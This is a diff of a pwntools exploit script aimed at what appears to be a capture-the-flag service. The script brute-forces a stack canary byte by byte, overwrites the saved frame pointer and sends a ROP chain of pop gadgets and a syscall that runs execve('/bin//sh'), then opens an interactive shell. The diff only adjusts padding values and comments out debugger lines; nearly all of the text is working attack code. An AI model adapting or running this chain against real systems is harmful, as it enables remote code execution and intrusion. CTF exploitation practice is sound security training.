@@ -32,13 +32,13 @@ Values """
 
 
 # Initial payload setting
-safe_stack_buf = p64(0x68732f2f6e69622f) + b'\x01' * 16
+safe_stack_buf = p64(0x68732f2f6e69622f) * 3
 
 canary = b""
 canary_len = 0
 byte_int_try = 0
 
-cover_rbp = b"\x01\x01\x01\x01\x01\x01\x01\x01"
+cover_rbp = p64(0x68732f2f6e69622f)
 
 rop_chain = b""
 rop_chain += p64(0x00000000004006c6) # -> pop rdi; ret;
@@ -49,15 +49,15 @@ rop_chain += p64(0x000000000044c2a6) # -> pop rdx; ret;
 rop_chain += p64(0x0000000000000000) # var
 rop_chain += p64(0x00000000004005cf) # -> pop rax; ret;
 rop_chain += p64(0x000000000000003b) # var
-rop_chain += p64(0x00000000004013ec) # syscall;
+rop_chain += p64(0x00000000004013ec) # -> syscall;
 
 
 # Start process
 p = remote("ctf.adl.tw", 10011)
 
 # attach process to gdb
-context.terminal = ['xterm', '-e']
-gdb.attach(p)
+# context.terminal = ['xterm-256color', '-e']
+# gdb.attach(p)
 
 # Brute-Forcing Canary
 while True:
@@ -93,6 +93,6 @@ print(canary.decode('latin-1').encode('unicode-escape').decode('ascii'))
 
 p.send(safe_stack_buf + canary + cover_rbp + rop_chain)
 
-gdb_command = 'x/40gx $rsi'
+# gdb_command = 'x/40gx $rsi'
 
 p.interactive()
